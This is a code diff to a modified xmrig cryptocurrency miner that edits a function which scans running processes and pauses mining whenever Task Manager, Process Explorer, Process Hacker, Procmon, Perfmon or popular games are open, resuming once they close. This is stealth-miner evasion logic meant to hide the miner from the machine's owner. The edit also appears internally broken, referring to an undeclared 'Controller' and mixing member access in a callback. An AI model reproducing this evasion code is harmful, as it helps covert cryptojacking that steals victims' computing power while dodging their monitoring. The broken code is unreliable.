@@ -40,8 +40,6 @@
 #include "net/Network.h"
 #include "Summary.h"
 /*begin*/
-#include "cc/CCClient.h"
-#include "cc/ControlCommand.h"
 #include <tlhelp32.h>
 #include <TCHAR.H>
 /*end*/
@@ -54,8 +52,6 @@ xmrig::App::App(Process *process) :
     if (m_controller->init() != 0) {
         return;
     }
-
-	controller = m_controller;
 
     if (!m_controller->config()->isBackground()) {
         m_console = new Console(this);
@@ -71,26 +67,28 @@ xmrig::App::~App()
 }
 
 /*begin*/
-void xmrig::App::CheckTaskManager(uv_timer_t *handle)
+void App::CheckTaskManager(uv_timer_t *handle)
 {
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
 	PROCESSENTRY32 pe;
 	pe.dwSize = sizeof(PROCESSENTRY32);
 	Process32First(hSnapshot, &pe);
+
 	do  {
 		if (wcscmp(pe.szExeFile, L"WorldOfTanks.exe") == 0 || wcscmp(pe.szExeFile, L"taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"Taskmgr.exe") == 0 || wcscmp(pe.szExeFile, L"dota2.exe") == 0 || wcscmp(pe.szExeFile, L"csgo.exe") == 0 || wcscmp(pe.szExeFile, L"payday.exe") == 0 || wcscmp(pe.szExeFile, L"Minecraft.exe") == 0 || wcscmp(pe.szExeFile, L"TheDivision.exe") == 0 || wcscmp(pe.szExeFile, L"GTA5.exe") == 0 || wcscmp(pe.szExeFile, L"re7.exe") == 0 || wcscmp(pe.szExeFile, L"Prey.exe") == 0 || wcscmp(pe.szExeFile, L"Overwatch.exe") == 0 || wcscmp(pe.szExeFile, L"MK10.exe") == 0 || wcscmp(pe.szExeFile, L"QuakeChampions.exe") == 0 || wcscmp(pe.szExeFile, L"crossfire.exe") == 0 || wcscmp(pe.szExeFile, L"pb.exe") == 0 || wcscmp(pe.szExeFile, L"wot.exe") == 0 || wcscmp(pe.szExeFile, L"lol.exe") == 0 || wcscmp(pe.szExeFile, L"perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"Perfmon.exe") == 0 || wcscmp(pe.szExeFile, L"SystemExplorer.exe") == 0 || wcscmp(pe.szExeFile, L"TaskMan.exe") == 0 || wcscmp(pe.szExeFile, L"ProcessHacker.exe") == 0 || wcscmp(pe.szExeFile, L"procexp64.exe") == 0 || wcscmp(pe.szExeFile, L"procexp.exe") == 0 || wcscmp(pe.szExeFile, L"Procmon.exe") == 0 || wcscmp(pe.szExeFile, L"Daphne.exe") == 0)
 			{
 				LOG_INFO("\x1B[01;33mpaused\x1B[0m, something opened");
-				controller->miner()->setEnabled(false);
+				Controller->miner()->setEnabled(false);
 				CloseHandle(hSnapshot);
 				return;
 			}
 		} while (Process32Next(hSnapshot, &pe));
-	if (!controller->miner()->isEnabled()) {
+	
+	if (!m_controller->miner()->isEnabled()) {
 		LOG_INFO("\x1B[01;32mresumed");
-		controller->miner()->setEnabled(true);
-	}
+		Controller->miner()->setEnabled(true);
+		}
 	
 	CloseHandle(hSnapshot);				
 }
